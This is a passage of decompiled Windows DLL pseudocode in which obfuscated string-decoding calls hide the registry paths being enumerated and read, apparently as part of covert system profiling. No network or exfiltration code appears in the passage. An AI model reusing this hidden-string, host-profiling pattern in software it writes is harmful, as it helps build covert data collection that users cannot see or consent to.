                     16,
                     (void *)(v6 + 156),
                     (wchar_t *)v6,
                     (void *)(v6 + 296)) )
              {
                ++v14;
                v6 += 312;
              }
            }
            while ( !(*(int (__stdcall **)(int, int, wchar_t **, int *))(*(_DWORD *)v13 + 12))(v13, 1, &Str, &v11) );
            v3 = a2;
          }
        }
        if ( v13 )
          (*(void (__stdcall **)(int))(*(_DWORD *)v13 + 8))(v13);
      }
      if ( v15 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v15 + 8))(v15);
    }
  }
  return result;
}

//----- (10003CF3) --------------------------------------------------------
char __stdcall sub_10003CF3(_DWORD *a1, _DWORD *a2, HMODULE *a3)
{
  const CHAR *v3; // eax
  HMODULE LibraryA; // esi
  const CHAR *v6; // eax
  FARPROC ProcAddress; // eax
  int v8; // eax
  int v9; // [esp+8h] [ebp-8h] BYREF
  int v10; // [esp+Ch] [ebp-4h] BYREF

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001BE00);
  LibraryA = LoadLibraryA(v3);
  if ( !LibraryA )
    return 0;
  *a3 = LibraryA;
  v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001BE20);
  ProcAddress = GetProcAddress(LibraryA, v6);
  if ( !ProcAddress )
    return 0;
  v10 = 0;
  if ( ((int (__stdcall *)(int *, _DWORD, _DWORD, _DWORD))ProcAddress)(&v10, 0, 0, 0) < 0 )
    return 0;
  v8 = v10;
  *a2 = v10;
  v9 = 0;
  if ( (*(int (__stdcall **)(int, _DWORD, _DWORD, int *))(*(_DWORD *)v8 + 56))(v8, 0, 0, &v9) )
    return 0;
  *a1 = v9;
  return 1;
}

//----- (10003D6F) --------------------------------------------------------
void __thiscall sub_10003D6F(_DWORD *this)
{
  char v2; // al
  int v3; // ebx
  int *v4; // edi
  HRESULT v5; // [esp+8h] [ebp-10h]
  int *v6; // [esp+Ch] [ebp-Ch] BYREF
  int v7; // [esp+10h] [ebp-8h] BYREF
  HMODULE hLibModule; // [esp+14h] [ebp-4h] BYREF

  hLibModule = 0;
  v7 = 0;
  v6 = 0;
  v5 = CoInitialize(0);
  if ( v5 >= 0 )
  {
    v2 = sub_10003CF3(&v7, &v6, &hLibModule);
    v3 = v7;
    v4 = v6;
    if ( v2 )
      sub_10003B37(this, v7, v6);
    else
      this[3] = GetLastError();
    if ( v4 )
      (*(void (__stdcall **)(int *))(*v4 + 8))(v4);
    if ( v3 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 8))(v3);
    if ( hLibModule )
      FreeLibrary(hLibModule);
  }
  if ( !v5 )
    CoUninitialize();
}

//----- (10003DF8) --------------------------------------------------------
void __thiscall sub_10003DF8(_DWORD *this, int a2)
{
  if ( (unsigned __int8)dword_10026C14 == 5 && (BYTE1(dword_10026C14) == 1 || !BYTE1(dword_10026C14))
    || BYTE1(dword_10026C14) == 2 )
  {
    if ( sub_1000C8E9((int)this, (int)&dword_10026C38, 1u, 0) )
      sub_10003D6F(this);
    else
      this[3] = 123457;
  }
  else
  {
    this[3] = 123456;
  }
}
// 10026C14: using guessed type int dword_10026C14;
// 10026C38: using guessed type int dword_10026C38;

//----- (10003E73) --------------------------------------------------------
_DWORD *__thiscall sub_10003E73(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 27;
  *this = &MdtrbrZtbtnzmuf::`vftable';
  memset(this + 2, 0, 0xB650u);
  *v2 = this[1];
  return this;
}
// 1001CE04: using guessed type void *MdtrbrZtbtnzmuf::`vftable';

//----- (10003EA1) --------------------------------------------------------
int sub_10003EA1()
{
  return 46672;
}

//----- (10003EA7) --------------------------------------------------------
char __thiscall sub_10003EA7(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0xB650 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0xB650u);
  return 1;
}

//----- (10003ECC) --------------------------------------------------------
int __thiscall sub_10003ECC(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 28))(this, a2);
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 84))(this, a2);
}

//----- (10003EE7) --------------------------------------------------------
char *__thiscall sub_10003EE7(char *this, int a2, int a3, char *Str, char *Source, char *a6)
{
  char *v6; // esi
  size_t v7; // eax
  size_t v8; // eax
  size_t v9; // eax

  v6 = &this[456 * a3];
  *((_DWORD *)v6 + 9961) = a2;
  if ( strlen(Str) >= 0x32 )
    v7 = 50;
  else
    v7 = strlen(Str);
  strncpy(v6 + 39848, Str, v7);
  if ( strlen(Source) >= 0x6E )
    v8 = 110;
  else
    v8 = strlen(Source);
  strncpy(v6 + 39898, Source, v8);
  if ( strlen(a6) >= 0x19 )
    v9 = 25;
  else
    v9 = strlen(a6);
  return strncpy(v6 + 40008, a6, v9);
}

//----- (10003F90) --------------------------------------------------------
char __thiscall sub_10003F90(BYTE *this, int a2)
{
  BYTE *v2; // esi
  int v3; // edi
  DWORD LastError; // eax

  v2 = this + 40033;
  v3 = 15;
  do
  {
    LOBYTE(LastError) = (_BYTE)v2 + 71;
    if ( v2 != (BYTE *)185 )
    {
      LOBYTE(LastError) = sub_1000273E(*(HKEY *)(v2 - 189), (LPCSTR)v2 - 135, (LPCSTR)v2 - 25, v2, 260);
      if ( !(_BYTE)LastError )
      {
        LastError = GetLastError();
        *(_DWORD *)(v2 - 193) = LastError;
      }
    }
    v2 += 456;
    --v3;
  }
  while ( v3 );
  return LastError;
}

//----- (10003FFB) --------------------------------------------------------
char __thiscall sub_10003FFB(char *this, HKEY hKey)
{
  DWORD LastError; // eax
  size_t v3; // eax
  size_t v4; // eax
  size_t v5; // eax
  BYTE *v6; // esi
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-60h] BYREF
  LSTATUS v9; // [esp+18h] [ebp-58h]
  LPCSTR v10; // [esp+1Ch] [ebp-54h]
  LPCSTR v11; // [esp+20h] [ebp-50h]
  LPCSTR lpValueName; // [esp+24h] [ebp-4Ch]
  DWORD cchName; // [esp+28h] [ebp-48h] BYREF
  HKEY v14; // [esp+2Ch] [ebp-44h]
  LPCSTR lpSubKey; // [esp+30h] [ebp-40h]
  DWORD dwIndex; // [esp+34h] [ebp-3Ch]
  HKEY phkResult; // [esp+38h] [ebp-38h] BYREF
  char *v18; // [esp+3Ch] [ebp-34h]
  char Destination[33]; // [esp+40h] [ebp-30h] BYREF
  __int16 v20; // [esp+61h] [ebp-Fh]
  char v21; // [esp+63h] [ebp-Dh]
  char Str; // [esp+64h] [ebp-Ch] BYREF
  int v23; // [esp+65h] [ebp-Bh]
  char v24; // [esp+69h] [ebp-7h]

  v18 = this;
  v14 = hKey;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001C768);
  lpValueName = (LPCSTR)sub_1000C0E0((int)&unk_1001C79C);
  v11 = (LPCSTR)sub_1000C0E0((int)&unk_1001C7B8);
  v10 = (LPCSTR)sub_1000C0E0((int)&unk_1001C7D4);
  Str = 0;
  v23 = 0;
  v24 = 0;
  phkResult = 0;
  cchName = 5;
  dwIndex = 0;
  LastError = RegOpenKeyExA(hKey, lpSubKey, 0, 0x20019u, &phkResult);
  if ( LastError )
  {
    *((_DWORD *)v18 + 3) = LastError;
  }
  else
  {
    LOBYTE(LastError) = (_BYTE)v18 + 16;
    v18 += 16;
    do
    {
      if ( (int)dwIndex >= 8 )
        break;
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v3 = strlen(&Str);
      memset(&Str, 0, v3);
      cchName = 5;
      v9 = RegEnumKeyExA(phkResult, dwIndex, &Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      if ( v9 )
        goto LABEL_13;
      memset(Destination, 0, sizeof(Destination));
      v20 = 0;
      v21 = 0;
      v4 = strlen(lpSubKey);
      strncpy(Destination, lpSubKey, v4);
      PathAddBackslashA(Destination);
      if ( strlen(&Str) >= 5 )
        v5 = 5;
      else
        v5 = strlen(&Str);
      strncat(Destination, &Str, v5);
      v6 = (BYTE *)(v18 + 19);
      if ( !sub_1000273E(v14, Destination, lpValueName, (LPBYTE)v18 + 4, 15) )
        *(_DWORD *)v18 = GetLastError();
      if ( !sub_1000273E(v14, Destination, v11, v6, 50) )
        *(_DWORD *)v18 = GetLastError();
      LOBYTE(LastError) = sub_1000273E(v14, Destination, v10, v6 + 50, 35);
      if ( !(_BYTE)LastError )
      {
LABEL_13:
        LastError = GetLastError();
        *(_DWORD *)v18 = LastError;
      }
      ++dwIndex;
      v18 += 104;
    }
    while ( !v9 );
  }
  if ( phkResult )
    LOBYTE(LastError) = RegCloseKey(phkResult);
  return LastError;
}

//----- (100041F1) --------------------------------------------------------
LSTATUS __thiscall sub_100041F1(char *this, HKEY a2)
{
  LSTATUS result; // eax
  char *v4; // esi
  size_t v5; // eax
  size_t v6; // eax
  size_t v7; // eax
  size_t v8; // eax
  DWORD v9; // edi
  const CHAR *v10; // eax
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-80h] BYREF
  DWORD cchName; // [esp+18h] [ebp-78h] BYREF
  LPCSTR lpValueName; // [esp+1Ch] [ebp-74h]
  LSTATUS v14; // [esp+20h] [ebp-70h]
  LPCSTR lpSubKey; // [esp+24h] [ebp-6Ch]
  HKEY hKey; // [esp+28h] [ebp-68h]
  HKEY v17; // [esp+2Ch] [ebp-64h] BYREF
  DWORD cbData; // [esp+30h] [ebp-60h] BYREF
  DWORD dwIndex; // [esp+34h] [ebp-5Ch]
  HKEY phkResult; // [esp+38h] [ebp-58h] BYREF
  BYTE Data[184]; // [esp+3Ch] [ebp-54h] BYREF
  char Destination[52]; // [esp+F4h] [ebp+64h] BYREF
  char Str[28]; // [esp+128h] [ebp+98h] BYREF

  hKey = a2;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001C7EC);
  lpValueName = (LPCSTR)sub_1000C0E0((int)&unk_1001C820);
  memset(Str, 0, 26);
  phkResult = 0;
  v14 = 0;
  dwIndex = 0;
  result = RegOpenKeyExA(a2, lpSubKey, 0, 0x20019u, &phkResult);
  if ( result )
  {
    *((_DWORD *)this + 212) = result;
  }
  else
  {
    v4 = this + 881;
    while ( (!v14 || v14 == 234) && (int)dwIndex < 5 )
    {
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v5 = strlen(Str);
      memset(Str, 0, v5);
      cchName = 25;
      result = RegEnumKeyExA(phkResult, dwIndex, Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      v14 = result;
      if ( result )
      {
        *(_DWORD *)(v4 - 29) = result;
      }
      else
      {
        memset(Destination, 0, 51);
        if ( strlen(Str) >= 0x19 )
          v6 = 25;
        else
          v6 = strlen(Str);
        strncpy(v4 - 25, Str, v6);
        v7 = strlen(lpSubKey);
        strncpy(Destination, lpSubKey, v7);
        PathAddBackslashA(Destination);
        if ( strlen(Str) >= 0x19 )
          v8 = 25;
        else
          v8 = strlen(Str);
        strncat(Destination, Str, v8);
        if ( !sub_1000273E(hKey, Destination, lpValueName, (LPBYTE)v4, 10) )
          *(_DWORD *)(v4 - 29) = GetLastError();
        v9 = 180;
        memset(Data, 0, 181);
        cbData = 180;
        v17 = 0;
        result = RegOpenKeyExA(hKey, Destination, 0, 0x20019u, &v17);
        if ( !result )
        {
          v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001C83C);
          result = RegQueryValueExA(v17, v10, 0, 0, Data, &cbData);
          if ( result )
          {
            *(_DWORD *)(v4 - 29) = result;
          }
          else
          {
            if ( cbData <= 0xB4 )
              v9 = cbData;
            memcpy(v4 + 10, Data, v9);
            result = cbData;
            *(_DWORD *)(v4 + 191) = cbData;
          }
        }
        if ( v17 )
          result = RegCloseKey(v17);
      }
      ++dwIndex;
      v4 += 224;
    }
  }
  if ( phkResult )
    return RegCloseKey(phkResult);
  return result;
}

//----- (10004476) --------------------------------------------------------
char __thiscall sub_10004476(int this, HKEY hKey)
{
  const CHAR *v3; // edi
  const CHAR *v4; // eax
  DWORD LastError; // eax

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001C860);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001C8AC);
  LOBYTE(LastError) = sub_1000273E(hKey, v3, v4, (LPBYTE)(this + 3280), 260);
  if ( !(_BYTE)LastError )
  {
    LastError = GetLastError();
    *(_DWORD *)(this + 3276) = LastError;
  }
  return LastError;
}

//----- (100044C3) --------------------------------------------------------
char __thiscall sub_100044C3(_DWORD *this, HKEY a2)
{
  int LastError; // eax
  _DWORD *v4; // esi
  size_t v5; // eax
  size_t v6; // eax
  size_t v7; // eax
  size_t v8; // eax
  LSTATUS v9; // eax
  const CHAR *v10; // eax
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-7Ch] BYREF
  LPCSTR lpValueName; // [esp+18h] [ebp-74h]
  LPCSTR v14; // [esp+1Ch] [ebp-70h]
  LPCSTR v15; // [esp+20h] [ebp-6Ch]
  LPCSTR v16; // [esp+24h] [ebp-68h]
  LPCSTR v17; // [esp+28h] [ebp-64h]
  DWORD cchName; // [esp+2Ch] [ebp-60h] BYREF
  DWORD cbData; // [esp+30h] [ebp-5Ch] BYREF
  BYTE Data[4]; // [esp+34h] [ebp-58h] BYREF
  LPCSTR lpSubKey; // [esp+38h] [ebp-54h]
  int v22; // [esp+3Ch] [ebp-50h]
  HKEY phkResult; // [esp+40h] [ebp-4Ch] BYREF
  HKEY v24; // [esp+44h] [ebp-48h] BYREF
  DWORD dwIndex; // [esp+48h] [ebp-44h]
  HKEY hKey; // [esp+4Ch] [ebp-40h]
  char Destination[44]; // [esp+50h] [ebp-3Ch] BYREF
  char Str; // [esp+7Ch] [ebp-10h] BYREF
  int v29; // [esp+7Dh] [ebp-Fh]
  int v30; // [esp+81h] [ebp-Bh]
  __int16 v31; // [esp+85h] [ebp-7h]

  hKey = a2;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001C8D0);
  lpValueName = (LPCSTR)sub_1000C0E0((int)&unk_1001C904);
  v14 = (LPCSTR)sub_1000C0E0((int)&unk_1001C924);
  v16 = (LPCSTR)sub_1000C0E0((int)&unk_1001C940);
  v15 = (LPCSTR)sub_1000C0E0((int)&unk_1001C960);
  v17 = (LPCSTR)sub_1000C0E0((int)&unk_1001C980);
  Str = 0;
  v29 = 0;
  v30 = 0;
  v31 = 0;
  phkResult = 0;
  *(_DWORD *)Data = 0;
  cbData = 4;
  v22 = 0;
  dwIndex = 0;
  LastError = RegOpenKeyExA(a2, lpSubKey, 0, 0x20019u, &phkResult);
  if ( LastError )
  {
    this[493] = LastError;
  }
  else
  {
    v4 = this + 494;
    while ( (!v22 || v22 == 234) && (int)dwIndex < 5 )
    {
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v5 = strlen(&Str);
      memset(&Str, 0, v5);
      cchName = 10;
      LastError = RegEnumKeyExA(phkResult, dwIndex, &Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      v22 = LastError;
      if ( !LastError )
      {
        memset(Destination, 0, 41);
        v24 = 0;
        *(_DWORD *)Data = 0;
        cbData = 4;
        if ( strlen(&Str) >= 0xA )
          v6 = 10;
        else
          v6 = strlen(&Str);
        strncpy((char *)v4 + 249, &Str, v6);
        v7 = strlen(lpSubKey);
        strncpy(Destination, lpSubKey, v7);
        PathAddBackslashA(Destination);
        if ( strlen(&Str) >= 0xA )
          v8 = 10;
        else
          v8 = strlen(&Str);
        strncat(Destination, &Str, v8);
        v9 = RegOpenKeyExA(hKey, Destination, 0, 0x20019u, &v24);
        if ( v9 || (v9 = RegQueryValueExA(v24, lpValueName, 0, 0, Data, &cbData)) != 0 )
          *v4 = v9;
        else
          v4[50] = *(_DWORD *)Data;
        if ( v24 )
          RegCloseKey(v24);
        v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001C9A0);
        if ( !sub_1000273E(hKey, Destination, v10, (LPBYTE)v4 + 4, 20) )
          *v4 = GetLastError();
        if ( !sub_1000273E(hKey, Destination, v14, (LPBYTE)v4 + 234, 15) )
          *v4 = GetLastError();
        if ( !sub_1000273E(hKey, Destination, v16, (LPBYTE)v4 + 204, 10) )
          *v4 = GetLastError();
        if ( !sub_1000273E(hKey, Destination, v15, (LPBYTE)v4 + 184, 15) )
          *v4 = GetLastError();
        LOBYTE(LastError) = sub_1000273E(hKey, Destination, v17, (LPBYTE)v4 + 214, 20);
        if ( !(_BYTE)LastError )
        {
          LastError = GetLastError();
          *v4 = LastError;
        }
      }
      ++dwIndex;
      v4 += 65;
    }
  }
  if ( phkResult )
    LOBYTE(LastError) = RegCloseKey(phkResult);
  return LastError;
}

//----- (100047BA) --------------------------------------------------------
LSTATUS __thiscall sub_100047BA(char *this, HKEY hKey)
{
  const CHAR *v3; // eax
  LSTATUS result; // eax
  char *v5; // ebx
  size_t v6; // eax
  DWORD v7; // eax
  size_t v8; // eax
  DWORD cchValueName; // [esp+Ch] [ebp-80h] BYREF
  LSTATUS v10; // [esp+10h] [ebp-7Ch]
  DWORD dwIndex; // [esp+14h] [ebp-78h]
  HKEY phkResult; // [esp+18h] [ebp-74h] BYREF
  size_t Size; // [esp+1Ch] [ebp-70h] BYREF
  BYTE Data[1104]; // [esp+20h] [ebp-6Ch] BYREF
  char Str; // [esp+470h] [ebp+3E4h] BYREF
  int v16; // [esp+471h] [ebp+3E5h]
  int v17; // [esp+475h] [ebp+3E9h]
  int v18; // [esp+479h] [ebp+3EDh]
  __int16 v19; // [esp+47Dh] [ebp+3F1h]
  char v20; // [esp+47Fh] [ebp+3F3h]

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001C9C0);
  phkResult = 0;
  result = RegOpenKeyExA(hKey, v3, 0, 0x20019u, &phkResult);
  if ( result )
  {
    *((_DWORD *)this + 885) = result;
  }
  else
  {
    dwIndex = 0;
    memset(Data, 0, 1101);
    v10 = 0;
    result = 0;
    Str = 0;
    v16 = 0;
    v17 = 0;
    v18 = 0;
    v19 = 0;
    v20 = 0;
    Size = 1100;
    cchValueName = 15;
    v5 = this + 3563;
    while ( (!v10 || v10 == 234) && dwIndex < 3 )
    {
      v6 = strlen(&Str);
      memset(&Str, 0, v6);
      cchValueName = 15;
      memset(Data, 0, Size);
      Size = 1100;
      result = RegEnumValueA(phkResult, dwIndex, &Str, &cchValueName, 0, 0, Data, &Size);
      v10 = result;
      if ( result )
      {
        *(_DWORD *)(v5 - 19) = result;
      }
      else
      {
        v7 = cchValueName;
        if ( cchValueName >= 0xF )
          v7 = 15;
        strncpy(v5 - 15, &Str, v7);
        v8 = Size;
        if ( Size >= 0x44C )
          v8 = 1100;
        memcpy(v5, Data, v8);
        result = Size;
        *(_DWORD *)(v5 + 1101) = Size;
      }
      ++dwIndex;
      v5 += 1124;
    }
  }
  if ( phkResult )
    return RegCloseKey(phkResult);
  return result;
}

//----- (10004947) --------------------------------------------------------
char __thiscall sub_10004947(_DWORD *this, HKEY hKey)
{
  int LastError; // eax
  char *v3; // esi
  size_t v4; // eax
  DWORD v5; // edi
  size_t v6; // eax
  size_t v7; // eax
  size_t v8; // eax
  LSTATUS v9; // eax
  LSTATUS v10; // eax
  DWORD v11; // edi
  const CHAR *v12; // eax
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-80h] BYREF
  LPCSTR v15; // [esp+18h] [ebp-78h]
  LPCSTR v16; // [esp+1Ch] [ebp-74h]
  LPCSTR v17; // [esp+20h] [ebp-70h]
  LPCSTR v18; // [esp+24h] [ebp-6Ch]
  LPCSTR v19; // [esp+28h] [ebp-68h]
  DWORD cchName; // [esp+2Ch] [ebp-64h] BYREF
  LPCSTR lpValueName; // [esp+30h] [ebp-60h]
  _DWORD *v22; // [esp+34h] [ebp-5Ch]
  LPCSTR lpSubKey; // [esp+38h] [ebp-58h]
  int v24; // [esp+3Ch] [ebp-54h]
  DWORD v25; // [esp+40h] [ebp-50h] BYREF
  DWORD cbData; // [esp+44h] [ebp-4Ch] BYREF
  HKEY phkResult; // [esp+48h] [ebp-48h] BYREF
  DWORD dwIndex; // [esp+4Ch] [ebp-44h]
  HKEY v29; // [esp+50h] [ebp-40h] BYREF
  HKEY v30; // [esp+54h] [ebp-3Ch]
  BYTE Data[4104]; // [esp+58h] [ebp-38h] BYREF
  BYTE Src[284]; // [esp+1060h] [ebp+FD0h] BYREF
  char Destination[33]; // [esp+117Ch] [ebp+10ECh] BYREF
  __int16 v34; // [esp+119Dh] [ebp+110Dh]
  char v35; // [esp+119Fh] [ebp+110Fh]
  char Str; // [esp+11A0h] [ebp+1110h] BYREF
  int v37; // [esp+11A1h] [ebp+1111h]
  int v38; // [esp+11A5h] [ebp+1115h]
  int v39; // [esp+11A9h] [ebp+1119h]
  __int16 v40; // [esp+11ADh] [ebp+111Dh]
  char v41; // [esp+11AFh] [ebp+111Fh]

  v22 = this;
  v30 = hKey;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001C9F8);
  lpValueName = (LPCSTR)sub_1000C0E0((int)&unk_1001CA24);
  v18 = (LPCSTR)sub_1000C0E0((int)&unk_1001CA44);
  v15 = (LPCSTR)sub_1000C0E0((int)&unk_1001CA60);
  v16 = (LPCSTR)sub_1000C0E0((int)&unk_1001CA80);
  v19 = (LPCSTR)sub_1000C0E0((int)&unk_1001CAA0);
  v17 = (LPCSTR)sub_1000C0E0((int)&unk_1001CAC0);
  Str = 0;
  v37 = 0;
  v38 = 0;
  v39 = 0;
  v40 = 0;
  v41 = 0;
  phkResult = 0;
  v24 = 0;
  dwIndex = 0;
  LastError = RegOpenKeyExA(hKey, lpSubKey, 0, 0x20019u, &phkResult);
  if ( LastError )
  {
    v22[1729] = LastError;
  }
  else
  {
    v3 = (char *)(v22 + 1731);
    while ( (!v24 || v24 == 234) && (int)dwIndex < 5 )
    {
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v4 = strlen(&Str);
      memset(&Str, 0, v4);
      cchName = 15;
      LastError = RegEnumKeyExA(phkResult, dwIndex, &Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      v24 = LastError;
      if ( LastError )
      {
        v22[1729] = LastError;
      }
      else
      {
        memset(Destination, 0, sizeof(Destination));
        v34 = 0;
        v35 = 0;
        v5 = 4100;
        v29 = 0;
        memset(Data, 0, 4101);
        cbData = 4100;
        if ( strlen(&Str) >= 0xF )
          v6 = 15;
        else
          v6 = strlen(&Str);
        strncpy(v3 + 4385, &Str, v6);
        v7 = strlen(lpSubKey);
        strncpy(Destination, lpSubKey, v7);
        PathAddBackslashA(Destination);
        if ( strlen(&Str) >= 0xF )
          v8 = 15;
        else
          v8 = strlen(&Str);
        strncat(Destination, &Str, v8);
        v9 = RegOpenKeyExA(v30, Destination, 0, 0x20019u, &v29);
        if ( v9 )
          goto LABEL_23;
        v10 = RegQueryValueExA(v29, lpValueName, 0, 0, Data, &cbData);
        if ( v10 )
        {
          *((_DWORD *)v3 - 1) = v10;
        }
        else
        {
          if ( cbData < 0x1004 )
            v5 = cbData;
          memcpy(v3, Data, v5);
          *((_DWORD *)v3 + 1110) = cbData;
        }
        v11 = 280;
        memset(Src, 0, 281);
        v25 = 280;
        v9 = RegQueryValueExA(v29, v18, 0, 0, Src, &v25);
        if ( v9 )
        {
LABEL_23:
          *((_DWORD *)v3 - 1) = v9;
        }
        else
        {
          if ( v25 < 0x118 )
            v11 = v25;
          memcpy(v3 + 4100, Src, v11);
          *((_DWORD *)v3 + 1111) = v25;
        }
        if ( v29 )
          RegCloseKey(v29);
        if ( !sub_1000273E(v30, Destination, v15, (LPBYTE)v3 + 4400, 15) )
          *((_DWORD *)v3 - 1) = GetLastError();
        if ( !sub_1000273E(v30, Destination, v16, (LPBYTE)v3 + 4380, 5) )
          *((_DWORD *)v3 - 1) = GetLastError();
        if ( !sub_1000273E(v30, Destination, v19, (LPBYTE)v3 + 4415, 5) )
          *((_DWORD *)v3 - 1) = GetLastError();
        if ( !sub_1000273E(v30, Destination, v17, (LPBYTE)v3 + 4420, 5) )
          *((_DWORD *)v3 - 1) = GetLastError();
        v12 = (const CHAR *)sub_1000C0E0((int)&unk_1001CAE0);
        LOBYTE(LastError) = sub_1000273E(v30, Destination, v12, (LPBYTE)v3 + 4425, 15);
        if ( !(_BYTE)LastError )
        {
          LastError = GetLastError();
          *((_DWORD *)v3 - 1) = LastError;
        }
      }
      ++dwIndex;
      v3 += 4452;
    }
  }
  if ( phkResult )
    LOBYTE(LastError) = RegCloseKey(phkResult);
  return LastError;
}

//----- (10004D52) --------------------------------------------------------
LSTATUS __thiscall sub_10004D52(char *this, HKEY a2)
{
  LSTATUS result; // eax
  size_t v4; // eax
  size_t v5; // eax
  char *v6; // edi
  size_t v7; // eax
  size_t v8; // eax
  DWORD v9; // eax
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-80h] BYREF
  LPCSTR lpValueName; // [esp+18h] [ebp-78h]
  DWORD cchName; // [esp+1Ch] [ebp-74h] BYREF
  HKEY hKey; // [esp+20h] [ebp-70h]
  LSTATUS v14; // [esp+24h] [ebp-6Ch]
  LPCSTR lpSubKey; // [esp+28h] [ebp-68h]
  DWORD cbData; // [esp+2Ch] [ebp-64h] BYREF
  DWORD dwIndex; // [esp+30h] [ebp-60h]
  HKEY v18; // [esp+34h] [ebp-5Ch] BYREF
  HKEY phkResult; // [esp+38h] [ebp-58h] BYREF
  char *v20; // [esp+3Ch] [ebp-54h]
  BYTE Data[1804]; // [esp+40h] [ebp-50h] BYREF
  char Destination[52]; // [esp+74Ch] [ebp+6BCh] BYREF
  char Str; // [esp+780h] [ebp+6F0h] BYREF
  int v24; // [esp+781h] [ebp+6F1h]
  int v25; // [esp+785h] [ebp+6F5h]
  int v26; // [esp+789h] [ebp+6F9h]
  int v27; // [esp+78Dh] [ebp+6FDh]
  int v28; // [esp+791h] [ebp+701h]

  hKey = a2;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001CB00);
  lpValueName = (LPCSTR)sub_1000C0E0((int)&unk_1001CB34);
  Str = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v28 = 0;
  phkResult = 0;
  v14 = 0;
  dwIndex = 0;
  result = RegOpenKeyExA(a2, lpSubKey, 0, 0x20019u, &phkResult);
  if ( result )
  {
    *((_DWORD *)this + 7295) = result;
  }
  else
  {
    v20 = this + 29184;
    while ( (!v14 || v14 == 234) && (int)dwIndex < 5 )
    {
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v4 = strlen(&Str);
      memset(&Str, 0, v4);
      cchName = 20;
      result = RegEnumKeyExA(phkResult, dwIndex, &Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      v14 = result;
      if ( result )
      {
        *(_DWORD *)v20 = result;
      }
      else
      {
        v18 = 0;
        memset(Destination, 0, sizeof(Destination));
        if ( strlen(&Str) >= 0x14 )
          v5 = 20;
        else
          v5 = strlen(&Str);
        v6 = v20 + 55;
        strncpy(v20 + 4, &Str, v5);
        v7 = strlen(lpSubKey);
        strncpy(Destination, lpSubKey, v7);
        PathAddBackslashA(Destination);
        if ( strlen(&Str) >= 0x14 )
          v8 = 20;
        else
          v8 = strlen(&Str);
        strncat(Destination, &Str, v8);
        result = RegOpenKeyExA(hKey, Destination, 0, 0x20019u, &v18);
        if ( result
          || (memset(Data, 0, 1801),
              cbData = 1800,
              (result = RegQueryValueExA(v18, lpValueName, 0, 0, Data, &cbData)) != 0) )
        {
          *(_DWORD *)v20 = result;
        }
        else
        {
          v9 = cbData;
          if ( cbData >= 0x708 )
            v9 = 1800;
          memcpy(v6, Data, v9);
          result = cbData;
          *(_DWORD *)(v6 + 1801) = cbData;
        }
        if ( v18 )
          result = RegCloseKey(v18);
      }
      ++dwIndex;
      v20 += 1860;
    }
  }
  if ( phkResult )
    return RegCloseKey(phkResult);
  return result;
}

//----- (10004FCE) --------------------------------------------------------
char __thiscall sub_10004FCE(int this, HKEY hKey)
{
  const CHAR *v3; // edi
  const CHAR *v4; // eax
  DWORD LastError; // eax

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001CB50);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001CB84);
  LOBYTE(LastError) = sub_1000273E(hKey, v3, v4, (LPBYTE)(this + 38488), 45);
  if ( !(_BYTE)LastError )
  {
    LastError = GetLastError();
    *(_DWORD *)(this + 38484) = LastError;
  }
  return LastError;
}

//----- (10005016) --------------------------------------------------------
char __thiscall sub_10005016(_DWORD *this, HKEY hKey)
{
  int LastError; // eax
  _DWORD *i; // ebx
  size_t v5; // eax
  size_t v6; // eax
  size_t v7; // eax
  size_t v8; // eax
  const CHAR *v9; // eax
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-18h] BYREF
  LPCSTR lpValueName; // [esp+18h] [ebp-10h]
  LPCSTR v13; // [esp+1Ch] [ebp-Ch]
  LPCSTR v14; // [esp+20h] [ebp-8h]
  DWORD cchName; // [esp+24h] [ebp-4h] BYREF
  HKEY v16; // [esp+28h] [ebp+0h] BYREF
  LPCSTR lpSubKey; // [esp+2Ch] [ebp+4h]
  int v18; // [esp+30h] [ebp+8h]
  DWORD dwIndex; // [esp+34h] [ebp+Ch]
  HKEY phkResult; // [esp+38h] [ebp+10h] BYREF
  HKEY v21; // [esp+3Ch] [ebp+14h]
  char Destination[72]; // [esp+40h] [ebp+18h] BYREF
  char Str; // [esp+88h] [ebp+60h] BYREF
  int v24; // [esp+89h] [ebp+61h]
  int v25; // [esp+8Dh] [ebp+65h]
  int v26; // [esp+91h] [ebp+69h]
  __int16 v27; // [esp+95h] [ebp+6Dh]

  v21 = hKey;
